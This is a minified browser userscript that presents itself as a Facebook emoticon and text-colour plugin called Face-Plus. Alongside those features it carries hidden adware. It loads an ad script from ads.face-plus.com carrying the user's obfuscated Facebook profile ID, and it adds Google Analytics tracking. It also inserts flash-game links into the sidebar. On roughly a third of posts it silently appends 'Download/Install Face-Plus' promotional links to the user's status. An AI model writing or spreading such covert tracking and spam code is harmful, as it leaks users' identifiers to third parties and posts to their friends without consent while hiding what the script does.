// ==UserScript==
// @name Face-Plus. Emoticons On Facebook
// @namespace UserScript of Face-Plus Firefox Plugin
// @author laurenceHR (code edited)
// @description  Agrega Emoticonos al Facebook. Es el plugin del firefox, pero sin necesidad de instalarlo, solo agregando este UserScript =P
// ==/UserScript==

var d=["#FF0000","#0000FF","#800000","#800080","#666666","#000000","#FF9933","#0099FF","#009900","#FF33CC","#999999","#333333","#FFFF00","#00FFFF","#00FF00","#FF99CC","#CCCCCC","#FFFFFF"],j=["http://www.face-plus.com/smiley/1.gif","http://www.face-plus.com/smiley/2.gif","http://www.face-plus.com/smiley/3.gif","http://www.face-plus.com/smiley/4.gif","http://www.face-plus.com/smiley/5.gif","http://www.face-plus.com/smiley/6.gif","http://www.face-plus.com/smiley/7.gif","http://www.face-plus.com/smiley/8.gif",
"http://www.face-plus.com/smiley/9.gif","http://www.face-plus.com/smiley/10.gif","http://www.face-plus.com/smiley/11.gif","http://www.face-plus.com/smiley/12.gif","http://www.face-plus.com/smiley/13.gif","http://www.face-plus.com/smiley/14.gif","http://www.face-plus.com/smiley/15.gif","http://www.face-plus.com/smiley/16.gif","http://www.face-plus.com/smiley/17.gif","http://www.face-plus.com/smiley/18.gif","http://www.face-plus.com/smiley/19.gif","http://www.face-plus.com/smiley/20.gif","http://www.face-plus.com/smiley/21.gif",
"http://www.face-plus.com/smiley/22.gif","http://www.face-plus.com/smiley/23.gif","http://www.face-plus.com/smiley/24.gif","http://www.face-plus.com/smiley/25.gif","http://www.face-plus.com/smiley/26.gif","http://www.face-plus.com/smiley/27.gif","http://www.face-plus.com/smiley/28.gif","http://www.face-plus.com/smiley/29.gif","http://www.face-plus.com/smiley/30.gif"],k=[":)",";)",":P",":D","<:)",":(",":mad:",":love:",":fire:",":ho:",":lost:","8|","\u2665",":blush:",":yawn:",":help:",":bla:",":whistle:",
":sleep:",":hit:",":ko:",":yuk:",":shut:",":roll:",":kiss:",":glasses:",":hat:",":bravo:",":yahoo:",":hello:"],l=[":)","=)",";)",":P",":D",":lol:","lol","lool","loool","l0l","^^","x)","mdrr","mdr","<:)",":(","=(",":mad:",":love:",":fire:",":@",":ho:",":lost:","8|","\u2665",":heart:","jtm","(l)","<3",":blush:",":yawn:",":help:",":bla:",":whistle:",":sleep:",":hit:",":ko:",":yuk:",":shut:",":roll:",":kiss:",":glasses:",":hat:",":bravo:",":yahoo:",":hello:",":bye:"],m=["1","1","2","3","4","4","4","4",
"4","4","4","4","4","4","5","6","6","7","8","9","9","10","11","12","13","13","13","13","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","30"],o=[];setTimeout(p,500);setTimeout(q,500);setTimeout(s,500);setTimeout(t,500);document.a=void 0;
function t(){if(document.getElementById("facebook"))if(!(document.location.href.indexOf("apps.facebook.com")<2)){var a=v("uiSideNav")[0];if(a&&a.getAttribute("FP_sideNav_updated")!="ok"){w();var b=[];switch(x.locale){case "fr":b.push('<a class="item" href="http://apps.facebook.com/jeux_flash_gratuits/?ref=canvas_bkmk_top"><span class="imgWrap"><img class="img" src="http://fb.telaxo.com/jeux_flash_gratuits/img/icone_fr.jpg"></span><span>Jeux Flash Gratuits</span></a>');break;case "es":b.push('<a class="item" href="http://apps.facebook.com/juegos_flash_gratis/?ref=canvas_bkmk_top"><span class="imgWrap"><img class="img" src="http://fb.telaxo.com/jeux_flash_gratuits/img/icone_es.jpg"></span><span>Juegos Flash Gratis</span></a>');
break;case "it":b.push('<a class="item" href="http://apps.facebook.com/giochi-flash-gratis/?ref=canvas_bkmk_top"><span class="imgWrap"><img class="img" src="http://fb.telaxo.com/jeux_flash_gratuits/img/icone_it.jpg"></span><span>Giochi Flash Gratis</span></a>');break;case "de":b.push('<a class="item" href="http://apps.facebook.com/kostenlose_flash_gam/?ref=canvas_bkmk_top"><span class="imgWrap"><img class="img" src="http://fb.telaxo.com/jeux_flash_gratuits/img/icone_de.jpg"></span><span>Kostenlose Flash Games</span></a>');
break;default:case "en":b.push('<a class="item" href="http://apps.facebook.com/free-flash-games/?ref=canvas_bkmk_top"><span class="imgWrap"><img class="img" src="http://fb.telaxo.com/jeux_flash_gratuits/img/icone_en.jpg"></span><span>Free Flash Games</span></a>');break}for(var e=0;e<b.length;e++){newnode=document.createElement("li");newnode.innerHTML=b[e];a.appendChild(newnode)}a.setAttribute("FP_sideNav_updated","ok");setTimeout(t,1E3)}}}var _gaq=_gaq||[];
function s(){if(document.getElementById("facebook")){if(!document.getElementById("FP_AD_ZonePub")){var a;(a=v("emu_sponsor")[0])||(a=document.getElementById("ssponsor"));a||(a=document.getElementById("ego"));a||(a=v("ego_unit")[0]);if(a){var b=document.createElement("div");b.id="FP_AD_ZonePub";b.style.width="160px";b.style.height="600px";b.style.marginLeft="auto";b.style.marginRight="auto";b.style.marginBottom="10px";b.innerHTML="&nbsp;";a.parentNode.insertBefore(b,a);b=document.createElement("script");
b.type="text/javascript";var e="http://ads.face-plus.com/ad.js?rd=u"+Math.random().toString(10).replace(".","")+"_",i=0,c=document.getElementById("pageNav");if(c){c=c.getElementsByTagName("a");for(var g=0,f=0;!g&&f<c.length;f++){var h=c[f].href;if(h.indexOf("profile.php")>1){i=h.substring(h.indexOf("?id=")+4);g=1}}}i=i*3;a2="";ihex=Math.floor(i/16);idiff=i-ihex*16;for(a2=y(idiff)+a2;ihex>=16;){itmp=Math.floor(ihex/16);idiff=ihex-itmp*16;a2=y(idiff)+a2;ihex=itmp}a1=y(ihex);for(res=a1+a2+"";res.length%
2!=0;)res="0"+res;b.src=e+res;a.parentNode.insertBefore(b,a);_gaq.push(["fp._setAccount","UA-1989846-8"]);_gaq.push(["fp._setDomainName","none"]);_gaq.push(["fp._setAllowLinker",true]);_gaq.push(["fp._trackPageview"]);b=document.createElement("div");b.innerHTML="<script type='text/javascript'>\t\t\t\tvar _gaq = _gaq || [];\t\t\t\t_gaq.push(['fp._setAccount', 'UA-1989846-8']);\t\t\t\t_gaq.push(['fp._setDomainName', 'none']);\t\t\t\t_gaq.push(['fp._setAllowLinker', true]);\t\t\t\t_gaq.push(['fp._trackPageview']);\t\t\t\t<\/script>";
a.parentNode.insertBefore(b,a);b=document.createElement("script");b.type="text/javascript";b.async=true;b.src=("https:"==document.location.protocol?"https://ssl":"http://www")+".google-analytics.com/ga.js";a.parentNode.insertBefore(b,a)}}setTimeout(s,1E3)}}function p(){document.getElementById("facebook")&&z()}
function z(){if(!v("MessageComposer")[0])if(!v("UISharer_Body")[0]){statut_input=v("UIComposer_TextArea")[0];if(!statut_input){statut_input=v("Mentions_Input")[0];if(!statut_input){setTimeout(z,1E3);return}}if(statut_input&&statut_input.getAttribute("tlx_status_updated")!="ok"){A(statut_input,"focus",B);statut_input.setAttribute("tlx_status_updated","ok")}}setTimeout(z,1E3)}var D,E,F;
function B(){w();if(!document.getElementById("tlx_div_editable")){var a=v("UIComposer_InputShadow")[0];F=document.createElement("div");F.id="tlx_div_commandes";F.className="uiHeaderBottomBorder";F.innerHTML='<ul class="UIComposer_Attachments" style="visibility: visible;margin-bottom:6px;">\t<li class="UIComposer_AttachmentPrompt">'+x.Commandes_Styles+'</li>\t<li class="UIComposer_Attachment" style="margin-right:3px;">\t<a href=# id="tlx_btn_bold" class="uiButton uiTooltip uiButtonSuppressed">\t<span class="uiButtonText">B</span>\t<span class="uiTooltipWrap"><span class="uiTooltipText">'+
x.Commandes_Bold+'</span></span></a></li>\t<li class="UIComposer_Attachment" style="margin-right:3px;">\t<a href=# id="tlx_btn_italic" class="uiButton uiButtonSuppressed uiTooltip">\t<span class="uiButtonText"><i>I</i></span>\t<span class="uiTooltipWrap"><span class="uiTooltipText">'+x.Commandes_Italic+'</span></span></a></li>\t<li class="UIComposer_Attachment" style="margin-right:3px;">\t<a href=# id="tlx_btn_underline" class="uiButton uiButtonSuppressed uiTooltip">\t<span class="uiButtonText"><u>U</u></span>\t<span class="uiTooltipWrap"><span class="uiTooltipText">'+
x.Commandes_Underline+'</span></span></a></li>\t<li class="UIComposer_Attachment" style="margin-right:3px;">\t<a href=# id="tlx_btn_linethrough" class="uiButton uiButtonSuppressed uiTooltip">\t<span class="uiButtonText" style="text-decoration:line-through;">S</span>\t<span class="uiTooltipWrap"><span class="uiTooltipText">'+x.Commandes_Linethrough+'</span></span></a></li>\t<li class="UIComposer_Attachment" style="margin-right:3px;">\t<a href=# id="tlx_btn_color" class="uiButton uiButtonSuppressed uiTooltip">\t<span id="btn_color_style" class="uiButtonText" style="color:red;">C</span>\t<span class="uiTooltipWrap"><span class="uiTooltipText">'+
x.Commandes_Color+'</span></span></a></li>\t<li class="UIComposer_Attachment" style="margin-right:3px;">\t<a href=# id="tlx_btn_smiley" class="uiButton uiButtonSuppressed uiTooltip">\t<span id="btn_smiley_style" class="uiButtonText" style="width:16px;background-image:url(http://www.face-plus.com/smiley/mini.gif); background-repeat: no-repeat;">&nbsp;</span>\t<span class="uiTooltipWrap"><span class="uiTooltipText">'+x.Commandes_Smiley+"</span></span></a></li>&nbsp;</ul>";a.appendChild(F);A(document.getElementById("tlx_btn_bold"),
"click",G);A(document.getElementById("tlx_btn_italic"),"click",H);A(document.getElementById("tlx_btn_underline"),"click",I);A(document.getElementById("tlx_btn_linethrough"),"click",J);A(document.getElementById("tlx_btn_color"),"click",K);A(document.getElementById("tlx_btn_smiley"),"click",L);E=document.createElement("div");E.id="tlx_div_editable";E.className="Mentions_Input";E.setAttribute("style","-webkit-user-modify:read-write;");E.style.fontFamily="verdana,arial,sans-serif";E.style.width="100%";
E.style.height="48px";E.style.overflow="auto";E.setAttribute("contentEditable","true");E.innerHTML="&nbsp;";a.appendChild(E);A(E,"keyup",M);A(E,"focus",N);D=v("Mentions_Input")[0];if(D.id=="tlx_div_editable")D=v("UIComposer_TextArea")[0];D.innerHTML="";D.style.display="none";bouton=v("UIComposer_SubmitButton")[0];a:{a=bouton.childNodes;for(var b=0;b<a.length;b++){obj=a[b];childName=obj.nodeName;if(childName=="input"||childName.toLowerCase()=="input"||childName.toUpperCase()=="input"){bouton=obj;break a}}bouton=
0}if(bouton.getAttribute("tlx_status_updated")!="ok"){A(bouton,"mousedown",O);A(bouton,"mouseup",P);A(bouton,"mouseup",Q);bouton.setAttribute("tlx_status_updated","ok")}setTimeout("document.getElementById('tlx_div_editable').focus();",50)}}function N(){R();var a=v("UIComposer")[0];if(a)a.className=a.className.replace(/(hide_buttons)/,"").replace(/(UIComposer_STATE_INPUT_FOCUSED)/,"")+" UIComposer_STATE_INPUT_FOCUSED"}function Q(){setTimeout(S,1E3)}
function S(){F.parentNode.removeChild(F);E.parentNode.removeChild(E);D.innerHTML="";D.style.display="block"}
function M(a){if(E.scrollHeight>48&&E.scrollHeight<150)E.style.height=E.scrollHeight+"px";if(a==null||a.keyCode==32||a.keyCode==13){a=D;var b=E.innerHTML,e=document.createElement("div");e.innerHTML=b;b=e.getElementsByTagName("*");for(var i=0;i<b.length;i++){var c=b[i],g=c.nodeName.toUpperCase();if(g=="SPAN"){var f=[];c.style.color!=""&&f.push("C="+T(c.style.color));c.style.fontWeight.indexOf("bold")>=0&&f.push("B");c.style.fontStyle.indexOf("italic")>=0&&f.push("I");c.style.textDecoration.indexOf("underline")>=
0&&f.push("U");c.style.textDecoration.indexOf("line-through")>=0&&f.push("S");if(f.length)c.innerHTML="["+f.join("|")+"]"+c.innerHTML+" [/]"}if(g=="FONT"){f=[];c.getAttribute("color")!=""&&f.push("C="+c.getAttribute("color").substring(1,7));if(f.length)c.innerHTML="["+f.join("|")+"]"+c.innerHTML+" [/]"}if(g=="STRONG")c.innerHTML="[B]"+c.innerHTML+" [/]";if(g=="EM")c.innerHTML="[I]"+c.innerHTML+" [/]";if(g=="U")c.innerHTML="[U]"+c.innerHTML+" [/]";if(g=="STRIKE")c.innerHTML="[S]"+c.innerHTML+" [/]";
if(g=="B"||g=="I"||g=="S")c.innerHTML="["+g+"]"+c.innerHTML+" [/]";if(g=="IMG"){f=c.className.substring(11);if(navigator.userAgent.toLowerCase().indexOf("msie")!=-1||navigator.userAgent.toLowerCase().indexOf("chrome")!=-1)c.outerHTML=" "+k[f]+" ";else{g=document.createElement("span");g.innerHTML=" "+k[f]+" ";try{e.insertBefore(g,c);e.removeChild(c)}catch(h){}}}}b=document.getElementById("tlx_div_editable");f=[];b.style.color!=""&&f.push("C="+T(b.style.color));b.style.fontWeight.indexOf("bold")>=0&&
f.push("B");b.style.fontStyle.indexOf("italic")>=0&&f.push("I");b.style.textDecoration.indexOf("underline")>=0&&f.push("U");b.style.textDecoration.indexOf("line-through")>=0&&f.push("S");if(f.length)e.innerHTML="["+f.join("|")+"]"+e.innerHTML+" [/]";e=e.innerHTML;e=e.replace(RegExp("(<br[^>]*>)","gi"),"[br]");e=e.replace(RegExp("(</p>)","gi"),"[br]");e=e.replace(/(<([^>]+)>)/ig,"");e=e.replace(RegExp("\\[br\\]","gi"),"<br>");a.innerHTML=e}}
function T(a){a=a.match(/\d+/g);for(var b=0;b<a.length;b++){a[b]=parseInt(a[b]).toString(16);if(a[b].length<2)a[b]="0"+a[b]}return a[0]+a[1]+a[2]}var U=false;function O(){if(/(^|\s)UIComposer_STATE_ATTACHMENT_AREA(\s|$)/.test(v("UIComposer_Content")[0].parentNode.className))U=true}
function P(){M(null);if(Math.round(Math.random()*100)<34)switch(Math.round(Math.random()*100)%3){default:case 0:var a=[];switch(x.locale){case "fr":a=Array("Telecharge Face-Plus : ","Installe Face-Plus : ");break;case "es":a=Array("Descarga Face-Plus: ","Instala Face-Plus: ");break;case "it":a=Array("Scarica Face-Plus: ","Installa Face-Plus: ");break;case "de":a=Array("Download Face-Plus: ","Installiere Face-Plus: ");break;case "tr":a=Array("Face-Plus indir: ","Face-Plus kur: ");break;case "id":a=
Array("Unduh Face-Plus: ","Instal Face-Plus: ");break;default:case "en":a=Array("Download Face-Plus: ","Install Face-Plus: ");break}D.innerHTML=D.innerHTML+" [Face+>] <br>"+(a[Math.round(Math.random()*(a.length-1))]+("http://u.face-plus.com/o/0-"+Math.round(Math.random()*100).toString(10)));break;case 1:a=[];switch(x.locale){case "fr":a=Array("Ajoute des smileys sur Facebook : ","Ajoute des smileys sur ton mur : ","Des smileys sur Facebook : ","Des smileys sur ton mur : ","Ajoute des smileys : ");
break;case "es":a=Array("A&ntilde;ade smileys en Facebook: ","A&ntilde;ade smileys en tu muro: ","Smileys en Facebook: ","Smileys en tu muro: ","A&ntilde;ade smileys: ");break;case "it":a=Array("Aggiungi delle faccine su Facebook: ","Aggiungi delle faccine sulla tua bacheca: ","Faccine su Facebook: ","Faccine sulla tua bacheca: ","Aggiungi delle faccine: ");break;case "de":a=Array("F&uuml;ge Facebook Smileys hinzu: ","F&uuml;ge deiner Pinnwand Smileys hinzu: ","Smileys bei Facebook: ","Smileys an deiner Pinnwand: ",
"F&uuml;ge Smileys hinzu: ");break;case "tr":a=Array("Facebook i&ccedil;ine ifade simgeleri ekle: ","Duvar&#305;na ifade simgeleri ekle: ","Facebook i&ccedil;inde ifade simgeleri: ","Duvar&#305;nda ifade simgeleri: ","Ifade simgeleri ekle: ");break;case "id":a=Array("Tambahkan ikon senyum ke Facebook: ","Tambahkan ikon senyum ke dindingmu: ","Ikon senyum di Facebook: ","Ikon senyum di dindingmu: ","Tambahkan ikon senyum: ");break;default:case "en":a=Array("Add smileys to Facebook: ","Add smileys to your wall: ",
"Smileys on Facebook: ","Smileys on your wall: ","Add smileys: ");break}D.innerHTML=D.innerHTML+" [Face+>] <br>"+(a[Math.round(Math.random()*(a.length-1))]+("http://u.face-plus.com/o/1-"+Math.round(Math.random()*100).toString(10)));break;case 2:a=[];switch(x.locale){case "fr":a=Array("Ecris en couleurs sur Facebook : ","Ecris en couleurs sur ton mur : ","Des couleurs sur Facebook : ","Des couleurs sur ton mur : ");break;case "es":a=Array("Escribe en color en Facebook: ","Escribe en color en tu muro: ",
"Colores en Facebook: ","Colores en tu muro: ");break;case "it":a=Array("Scrivi a colori su Facebook: ","Scrivi a colori sulla tua bacheca: ","Colori su Facebook: ","Colori sulla tua bacheca: ");break;case "de":a=Array("Schreibe in Farbe bei Facebook: ","Schreibe in Farbe an deine Pinnwand: ","Farben bei Facebook: ","Farben an deiner Pinnwand: ");break;case "tr":a=Array("Facebook i&ccedil;inde renkli yaz&#305; yaz: ","Duvar&#305;na renkli yaz&#305; yaz: ","Facebook i&ccedil;inde renkler: ","Duvar&#305;nda renkler: ");
break;case "id":a=Array("Warnai tulisanmu di Facebook: ","Warnai tulisan dindingmu: ","Warna-warni di Facebook: ","Warna-warni di dindingmu: ");break;default:case "en":a=Array("Write in color on Facebook: ","Write in color on your wall: ","Colors on Facebook: ","Colors on your wall: ");break}D.innerHTML=D.innerHTML+" [Face+>] <br>"+(a[Math.round(Math.random()*(a.length-1))]+("http://u.face-plus.com/o/2-"+Math.round(Math.random()*100).toString(10)));break}if(!U)(a=v("UIComposer_AttachmentArea")[0])&&
a.parentNode.removeChild(a)}function G(){document.execCommand("bold",false,null);M(null);E.focus()}function H(){document.execCommand("italic",false,null);M(null);E.focus()}function I(){document.execCommand("underline",false,null);M(null);E.focus()}function J(){document.execCommand("strikethrough",false,null);M(null);E.focus()}
function K(){R();var a=document.getElementById("color_picker");if(a)a.style.display="block";else{a=document.createElement("div");a.id="color_picker";a.style.zIndex=100;a.style.position="absolute";a.style.fontFamily="verdana,arial,sans-serif";a.style.left="133px";a.style.top="24px";a.style.width="132px";a.style.height="66px";a.style.backgroundColor="#555555";a.style.border="1px solid silver";a.style.overflow="hidden";for(var b=0;b<d.length;b++){color=document.createElement("a");color.id=d[b];color.style.color=
d[b];color.style.backgroundColor=d[b];color.style.display="block";color.style.styleFloat="left";color.style.cssFloat="left";color.style.fontSize="1px";color.style.width="16px";color.style.height="16px";color.style.padding="2px";color.style.border="1px solid white";color.setAttribute("href","#");color.innerHTML="&nbsp;";A(color,"click",V);a.appendChild(color)}document.getElementById("tlx_btn_color").parentNode.appendChild(a)}}
function V(){R();color=this.id.replace("#","");color=this.id;document.execCommand("forecolor",false,color);M(null);E.focus();document.getElementById("btn_color_style").style.color="#"+color}
function L(){R();var a=document.getElementById("smiley_picker");if(a)a.style.display="block";else{a=document.createElement("div");a.id="smiley_picker";a.style.zIndex=100;a.style.position="absolute";a.style.left="154px";a.style.top="24px";a.style.backgroundColor="#FFFFFF";a.style.border="1px solid silver";for(var b="<table border=0 cellspacing=0 height=216 width=230><tr>",e=0;e<j.length;e++){b+='<td valign=center style="width:40px; height:30px;border: 1px solid silver;padding:2px;">';b+="<center><a href=# id=tlx_a_smiley_"+
e+' title="'+k[e]+'"><img src="'+j[e]+'"/></a></center>';b+="</td>";if(e%5==4&&e+1<j.length)b+="</tr><tr>"}b+="</tr></table>";a.innerHTML=b;document.getElementById("tlx_btn_smiley").parentNode.appendChild(a);for(e=0;e<j.length;e++)A(document.getElementById("tlx_a_smiley_"+e),"click",W)}}
function W(){R();var a=this.id.substring(13),b=document.createElement("img");b.src=j[a];b.className="tlx_smiley_"+a;E.appendChild(b);b=document.createElement("span");b.outerHTML="";E.appendChild(b);M(null);E.focus()}function R(){var a=document.getElementById("color_picker");if(a)a.style.display="none";if(a=document.getElementById("smiley_picker"))a.style.display="none"}
function q(){if(document.getElementById("facebook")){var a=document.getElementById("status_text");a||(a=document.getElementById("profile_name"));a&&X(a);var b;if(document.getElementById("home_stream")){var e=v("UIImageBlock_Content");b="h6"}else if(document.getElementById("profile_stream_container")){e=v("UIStory");b="h3"}else if(v("faceplus_to_translate")[0]){e=v("faceplus_code");b="span"}else{setTimeout(q,1E3);return}for(a=0;a<e.length;a++){var i=e[a].getElementsByTagName(b)[0];if(i)if(i.getAttribute("tlx_translator_updated")!=
"ok"){ret=X(i);i.setAttribute("tlx_translator_updated","ok");if(ret){setTimeout(q,200);return}}}b=v("comment_actual_text");for(a=0;a<b.length;a++)if(b[a].getAttribute("tlx_translator_updated")!="ok"){ret=X(b[a]);b[a].setAttribute("tlx_translator_updated","ok");if(ret){setTimeout(q,200);return}}setTimeout(q,1E3)}}
function X(a){var b=a.innerHTML,e="",i=b,c=b.indexOf("[Face+&gt;]");if(c!=-1)b=b.substring(0,c);c=b.indexOf("actorName");if(c!=-1){c=b.indexOf("</a>",c+1)+4;e=b.substring(0,c);b=b.substring(c)}c=b.indexOf("[!f+]");if(c!=-1){var g=b.indexOf("[/!f+]");if(g!=-1)b=b.substr(0,c)+b.substr(g)}if(!o.length)for(c=0;c<l.length;c++)o[c]=RegExp(Y(l[c]),"gi");b=b.replace(RegExp(Y("&lt;:)"),"gi"),'<img src="'+j[4]+'">');for(c=0;c<l.length;c++)b=b.replace(o[c],'<img src="'+j[m[c]-1]+'">');pattern=RegExp("(\\[[^\\[]*\\])",
"ig");elts=b.split(pattern);b=[];for(c=0;c<elts.length;c++){s_elt=elts[c];if(s_elt=="[/]")b.push("</span>");else if(s_elt.substr(0,1)=="["){g=[];for(var f=s_elt.substr(1,s_elt.length-2).split("|"),h=0;h<f.length;h++){if(f[h]=="B"||f[h]=="b")g.push("font-weight:bold;");if(f[h]=="I"||f[h]=="i")g.push("font-style:italic;");if(f[h]=="U"||f[h]=="s")g.push("text-decoration:underline;");if(f[h]=="S"||f[h]=="u")g.push("text-decoration:line-through;");if(f[h].substr(0,2)=="C="||f[h].substr(0,2)=="c=")g.push("color:#"+
f[h].substr(2,6)+";")}b.push('<span style="'+g.join("")+'">')}else b.push(s_elt)}b=b.join("");if(i==b)return 0;a.innerHTML=e+b;return 1}function y(a){return"0123456789ABCDEF".charAt(a)}function Y(a){return a.replace("(","\\(").replace(")","\\)").replace("|","\\|").replace("^^","\\^\\^").replace("?","\\?")}function A(a,b,e,i){if(a.addEventListener)a.addEventListener(b,e,i);else if(a.attachEvent){a["e"+b+e]=e;a[b+e]=function(){a["e"+b+e](window.event)};a.attachEvent("on"+b,a[b+e])}}
function v(a,b,e){v=document.getElementsByClassName?function(i,c,g){g=g||document;i=g.getElementsByClassName(i);c=c?RegExp("\\b"+c+"\\b","i"):null;g=[];for(var f,h=0,n=i.length;h<n;h+=1){f=i[h];if(!c||c.test(f.nodeName))g.push(f)}return g}:document.evaluate?function(i,c,g){c=c||"*";g=g||document;var f=i.split(" "),h="",n=document.documentElement.namespaceURI==="http://www.w3.org/1999/xhtml"?"http://www.w3.org/1999/xhtml":null;i=[];for(var u,r=0,C=f.length;r<C;r+=1)h+="[contains(concat(' ', @class, ' '), ' "+
f[r]+" ')]";try{u=document.evaluate(".//"+c+h,g,n,0,null)}catch(Z){u=document.evaluate(".//"+c+h,g,null,0,null)}for(;c=u.iterateNext();)i.push(c);return i}:function(i,c,g){c=c||"*";g=g||document;var f=i.split(" ");i=[];c=c==="*"&&g.all?g.all:g.getElementsByTagName(c);g=[];var h;h=0;for(var n=f.length;h<n;h+=1)i.push(RegExp("(^|\\s)"+f[h]+"(\\s|$)"));n=0;for(var u=c.length;n<u;n+=1){f=c[n];h=false;for(var r=0,C=i.length;r<C;r+=1){h=i[r].test(f.className);if(!h)break}h&&g.push(f)}return g};return v(a,
b,e)}var x=[];
function w(){if(!x.length){var a=document.body.className;a=a.split(" ");for(var b=0;b<a.length;b++)if(a[b].indexOf("Locale")!=-1){a=a[b].substring(7,9);break}x.locale=a;switch(a){case "fr":x.Commandes_Styles="Styles&nbsp;:";x.Commandes_Bold="Gras";x.Commandes_Italic="Italique";x.Commandes_Underline="Soulign&eacute;";x.Commandes_Linethrough="Barr&eacute;";x.Commandes_Color="Couleur";x.Commandes_Smiley="Smiley";break;case "es":x.Commandes_Styles="Estilos:";x.Commandes_Bold="Negrita";x.Commandes_Italic="Bastardilla";
x.Commandes_Underline="Subrayado";x.Commandes_Linethrough="Tachado";x.Commandes_Color="Color";x.Commandes_Smiley="Smiley";break;case "it":x.Commandes_Styles="Stile:";x.Commandes_Bold="Grassetto";x.Commandes_Italic="Corsivo";x.Commandes_Underline="Sottolineato";x.Commandes_Linethrough="Barrato";x.Commandes_Color="Colore";x.Commandes_Smiley="Faccina";break;case "de":x.Commandes_Styles="Stil:";x.Commandes_Bold="Fett";x.Commandes_Italic="Kursiv";x.Commandes_Underline="Unterstrichen";x.Commandes_Linethrough=
"Durchgestrichen";x.Commandes_Color="Farbe";x.Commandes_Smiley="Smiley";break;case "tr":x.Commandes_Styles="Stiller:";x.Commandes_Bold="Kalin";x.Commandes_Italic="Italik";x.Commandes_Underline="Alti &ccedil;izili";x.Commandes_Linethrough="&Uuml;st&uuml; &ccedil;izili";x.Commandes_Color="Renk";x.Commandes_Smiley="Ifade simgesi";break;case "id":x.Commandes_Styles="Model:";x.Commandes_Bold="Tebal";x.Commandes_Italic="Miring";x.Commandes_Underline="Garis bawah";x.Commandes_Linethrough="Garis tengah";
x.Commandes_Color="Warna";x.Commandes_Smiley="Ikon senyum";break;default:case "en":x.Commandes_Styles="Styles:";x.Commandes_Bold="Bold";x.Commandes_Italic="Italic";x.Commandes_Underline="Underline";x.Commandes_Linethrough="Strikethrough";x.Commandes_Color="Color";x.Commandes_Smiley="Smiley";break}}};